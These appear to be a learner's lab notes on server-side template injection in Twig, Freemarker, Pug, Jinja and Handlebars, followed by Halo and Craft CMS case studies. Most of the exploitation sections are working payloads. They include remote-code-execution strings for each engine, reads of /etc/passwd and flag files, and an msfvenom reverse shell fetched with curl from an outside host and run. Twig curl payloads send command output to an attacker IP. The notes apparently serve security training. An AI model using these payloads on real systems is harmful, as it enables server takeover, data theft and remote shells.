#### Server-side Template Injection

```
Templating Engines
Twig - Discovery and Exploitation
Apache Freemarker - Discovery and Exploitation
Pug - Discovery and Exploitation
Jinja - Discovery and Exploitation
Mustache and Handlebars - Discovery and Exploitation
Halo Case Study
Sprout Forms Case Study

```
###### Expression
double opening curly brackets ({{) instruct the engine that an expression will follow, while double closing curly brackets (}}) indicate that the expression has ended.

###### Statement
These instructions begin with an open curly bracket and a percent sign ({%), which indicates a statement. A statement can perform actions such as looping through a variable or checking with an if statement.


  ###### Template

```
  01  Hello {{ name }},
02
03  Thank you for your order! Your items will be shipped out shortly:
04  {% for product in cart %}
05  {{product.name}}
06          Price:  ${{product.price}}
07          Quantity: {{product.quantity}}
08          Total:  ${{product.quantity * product.price}}
09  {% endfor %}____________________
10  Total:          ${{total}}
11
12  {% if cart|length > 1 %}
13  These items{% else %}
14  This item{% endif %} will be shipped to:
15  {{address}}

```

Template Engines

|TEMPLATING ENGINE|	LANGUAGE|	SERVER/CLIENT SIDE|
|-----------------|---------|-------------------|
|Twig	|PHP	|Server Side|
|Freemarker	|Java (usually)	|Server Side|
|Pug/Jade	|JavaScript	|Mostly Server Side|
|Jinja	|Python	|Server Side|
|Handlebars	|JavaScript	|Both|
|Mustache	|Multiple	|Varies|


Mustache -> Handlebars-> jinja-> Freemaker-> Twig-> Pug


##### Twig

PHP based

In Twig, {{5*5}} is 25.
 {{5*'5'}} is 25

{{5*'a'}} will produce error.

 Twig supports adding a "-" character to the delimiter to trim whitespace.6 This means if we add a couple of extra spaces, use a statement with the "-" character, and review the output, we should find that the output won't have the extra whitespaces if the target is indeed running Twig.


 1
(Symfony, 2021), https://twig.symfony.com/ ↩︎

2
(Laravel, 2021), https://laravel.com/ ↩︎

3
(Symfony, 2021), https://symfony.com/ ↩︎

4
(Cake Software Foundation, 2021), https://cakephp.org/ ↩︎

5
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Model–view–controller ↩︎

6
(Symfony, 2021), https://twig.symfony.com/doc/3.x/templates.html#whitespace-control ↩︎


Twig templates:

```

<h1>{% if not admin %}sudo {% endif %}make me a sandwich, {{name|capitalize}}!</h1>
We are using Twig remotely to generate this template

```

If Loop:

```
{% if not admin %}sudo {% endif %}

```

For Loop:

```
{% for key, child in SECRET_ARRAY %}
{{child}}
{% endfor %}

{% for child in SECRET_ARRAY %}
{{child}}
{% endfor %}

```

##### Twig - Exploitation

Using filters. For example, filters like filter, join, map, reduce, slice, and sort stand out since they might accept functions for additional processing.

From Twig documentation - reduce filter

```
{% set numbers = [1, 2, 3] %}

{{ numbers|reduce((carry, v) => carry + v) }}
{# output 6 #}

```
Arguments for reduce function:

```
Arguments

    arrow: The arrow function
    initial: The initial value
```

RCE:

```
{{[0]|reduce('system','whoami')}}
```

```
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
```



1
(Symfony, 2021), https://twig.symfony.com/doc/3.x/filters/index.html ↩︎

2
(Symfony, 2021), https://twig.symfony.com/doc/3.x/filters/reduce.html ↩︎

3
(Symfony, 2022) https://twig.symfony.com/doc/3.x/filters/filter.html ↩︎

4
(PHP.net, 2023), https://www.php.net/manual/en/function.system.php ↩︎

```

{{['cat /var/www/flag.txt']|filter('system')|join(',')}}

{{[0]|reduce('system','cat /var/www/flag.txt')}}

{{['cat /var/www/flag.txt']|filter('system')}}

{{['whoami']|filter('system')}}

{{[0]|reduce('exec','whoami')}}

{{['id']|map('system')|join(',') }}

{{['id']|map('system')}}

{{['id',1]|sort('system')|join(',')}}

```
Different php functions

```
{{ numbers|reduce('system','whoami')}}
{{ numbers|reduce('exec','whoami')}}
{{ numbers|reduce('shell_exec','whoami')}}
```
##### Freemarker 

Java based

Template:

```
01  <h1>Hello ${name}!</h1>
02  <#if name == "hacker">
03  The top reasons you're great:
04    <#list reasons as reason>
05     ${reason?index + 1}: ${reason}
06    </#list>
07  </#if>

```

Freemaker Expression:

```
<h1>Hello ${name}!</h1>

```
Freemaker Statement:

```
02  <#if name == "hacker">
...
07  </#if>

```

Loop in Freemaker:

```
04    <#list reasons as reason>
05     ${reason?index + 1}: ${reason}
06    </#list>

```
Before 2016, Freemarker required developers to specify if a variable needs to be HTML escaped. It's easy to overlook this setting when displaying variables. After 2016, Freemarker implemented a system that would auto-escape variables if the content type was an HTML document. This means that applications that use Freemarker templates are much more susceptible to XSS than other templating engines. We can observe this by wrapping the name with an HTML tag. We'll set the name to be "<i>Ofira</i>".

Freemaker non-string variable:

```
{
  "reasons": [
    "You give it your all",
    "You try your hardest",
    "You're kind"
  ]
}

```


Sol:

```

${SECRET_STRING}

<#list SECRET_ARRAY as item>
${item}
</#list>

<script>alert(1)</script>

```

###### Freemarker - Discovery

${7*7} -> 49
${7*'7'} -> error

###### Freemarker - Exploitation

class has to implement the TemplateModel class

freemarker.template.utility.Execute

Freemaker execute payload:

```
${"freemarker.template.utility.Execute"?new()("whoami")}

```
Sol:

```
${"freemarker.template.utility.Execute"?new()("cat /root/flag.txt")}

```

Reverse shelll:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.223 LPORT=443 EXITFUNC=thread -f elf -o revshell

${"freemarker.template.utility.Execute"?new()("curl http://192.168.45.223/revshell -o /tmp/revshell && chmod 777 /tmp/revshell && /tmp/revshell")}

```



1
(Apache, 2021), https://freemarker.apache.org/docs/app_faq.html ↩︎

2
(Apache, 2021), https://freemarker.apache.org/docs/api/index.html ↩︎

3
(Apache, 2021), https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html ↩︎


##### PUG

Javascript template engine

Pug is commonly integrated with the Express2 framework in a NodeJS3 application.

Pug template:

```
01   h1 Hello, #{name}
02   input(type='hidden' name='admin' value='true')
03 
04   if showSecret
05     - secret = ['❤️','😍', '🤟']
06     p The secrets are: 
07     each val in secret
08       p #{val}
09   else
10    p No secret for you!

```
Pug expression:

```
h1 Hello, #{name}
```
h1 is HTML tag.
Tag attributes:

```
input(type='hidden' name='admin' value='true')

```

If statement in Pug:

```
04   if showSecret
...
09   else
10     p No secret for you!

```

Code in Pug:

```
 - secret = ['❤️','😍', '🤟']
 
```
Using the dash character (-) in front of Pug indicates that the code should be executed by the JavaScript engine and the output should not be displayed (unbuffered code5).

Buffered code:

```
= secret = ['❤️','😍', '🤟']

```
Pug also supports buffered code, which displays the output of the command. We can instruct Pug to run as buffered code by using an equal sign instead of the dash.

Pug expects the first word of a line to be a tag

#{"7"*7} -> <49>


Sol:

```
p #{SECRET_STRING}

```
1
(Lindesay, 2015), https://github.com/pugjs/pug/issues/2184 ↩︎

2
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Express.js ↩︎

3
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Node.js ↩︎

4
(Pug, 2021), https://pugjs.org/language/plain-text.html ↩︎

5
(Pug, 2021), https://pugjs.org/language/code.html ↩︎

Searching for "NodeJS execute System Command", we'll find the documentation for the child_process.spawnSync command, which executes system commands on the target. The child_process module isn't accessible by default. Instead, we will need to use the require function to import it.

Check if require exists

```
= require

```

else:

```
= global.process.mainModule.require

```
Storing require as variable:

```
- var require = global.process.mainModule.require
= require('child_process')

```
Executing spawnSync:

```
- var require = global.process.mainModule.require
= require('child_process').spawnSync('whoami').stdout

```
Sol:

```
- var require = global.process.mainModule.require
= require('child_process').spawnSync('cat', ['/root/flag.txt']).stdout

```


1
(Nodejs, 2021), https://nodejs.org/docs/latest/api/child_process.html#child_process_child_process_spawnsync_command_args_options ↩︎

##### Jinja - Discovery

Jinja1 is a popular templating engine for Python.

Jinja template engine:

```
01	<h1>Hey {{ name }}</h1>
02	{% if reasons %}
03	Here are a couple of reasons why you are great:
04	<ul>
05	{% for r in reasons %}
06		<li>{{r}}</li>
07	{% endfor %}
08	</ul>
09	{% endif %}

```

{{5*'5'}} -> 55555

Flask sets six global variables: config, request, session, g, url_for(), and get_flashed_messages(). 

{{request}}

###### Jinja - Exploitation

{{config|pprint}}




##### Mustache and Handlebars - Discovery

The Mustache1 templating engine is supported by multiple languages and frameworks.It can render templates on the server- or client-side using JavaScript.it is considered "logic-less". Mustache only supports simple if statements to check whether variables exist or to loop through an array. Mustache injections might only lead to sensitive information disclosure if we know which variables to display, or XSS.

The most popular Handlebars library is for JavaScript,2 which allows for client and server-side rendering; however, there are also Handlebars libraries for Java,3 .NET,4 PHP,5 and more. In this section, we'll focus on handlebars.js.


Handlebars template:

```
01  <h1>Hello {{name}}</h1>
02  {{#if nicknames}}
03  Also known as:
04    {{#each nicknames}}
05        {{this}}
06    {{/each}}
07  {{/if}}
08
09  We are using handlebars locally in your browser to generate this template

```
Expression:

```
 <h1>Hello {{name}}</h1>
 
```
 Handlebars Helpers:
 
 ```
 02  {{#if nicknames}}
03  Also known as:
04    {{#each nicknames}}
05        {{this}}
06    {{/each}}
07  {{/if}}

 ```
 
1
(Mustache , 2019), https://mustache.github.io/ ↩︎

2
(handlebars-lang, 2021), https://github.com/handlebars-lang/handlebars.js ↩︎

3
(jknack, 2020), https://github.com/jknack/handlebars.java ↩︎

4
(Handlebars-Net, 2021), https://github.com/Handlebars-Net/Handlebars.Net ↩︎

5
(XaminProject, 2016), https://github.com/XaminProject/handlebars.php ↩︎


###### Mustache and Handlebars - Exploitation

One example is a repository named handlebars-helpers.

The read3 helper is used to "read a file from the file system." The readdir4 helper will "return an array of files from the given directory." If an application uses the Handlebars templating engine and uses handlebars-helpers, we may be able to steal sensitive files from the file system.

```
{{#each (readdir "/etc")}}
  {{this}}
{{/each}}

```

```
{{read "/etc/passwd"}}

```


1
(NPM, 2018), https://www.npmjs.com/advisories/755 ↩︎

2
(helpers, 2017), https://github.com/helpers/handlebars-helpers ↩︎

3
(helpers, 2017), https://github.com/helpers/handlebars-helpers ↩︎

4
(helpers, 2017), https://github.com/helpers/handlebars-helpers#readdir ↩︎


##### Halo CMS

Halo CMS reverse shell:

Happened in multiple step using theme editor. Created a elf executable. transferred using curl. then made in executable and then ran it.

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("/tmp/shell.elf") }

```
##### Craft CMS

Twig

```
gobuster dir --wordlist /usr/share/wordlists/dirb/common.txt --url http://craft/
```
###### Blind injection

```
{{[0]|reduce('system','curl http://192.168.49.51/helloFromTheOtherSide')}}

```


```
{{[0]|reduce('system','curl http://192.168.49.51/?exfil=' ~ exfil)}}

{% set exfil = "Hello & Goodbye"| url_encode %}
{{[0]|reduce('system','curl http://192.168.49.51/?exfil=' ~ exfil)}}

```
Exfil whoami output:

```
{% set output %}
{{[0]|reduce('system','whoami')}}
{% endset %}

{% set exfil = output| url_encode %}
{{[0]|reduce('system','curl http://192.168.49.51/?exfil=' ~ exfil)}}

```



1
(Symfony, 2021), https://twig.symfony.com/doc/3.x/templates.html#expressions ↩︎

2
(Symfony, 2021), https://twig.symfony.com/doc/3.x/filters/url_encode.html ↩︎

3
(Symfony, 2021), https://twig.symfony.com/doc/3.x/tags/set.html ↩︎




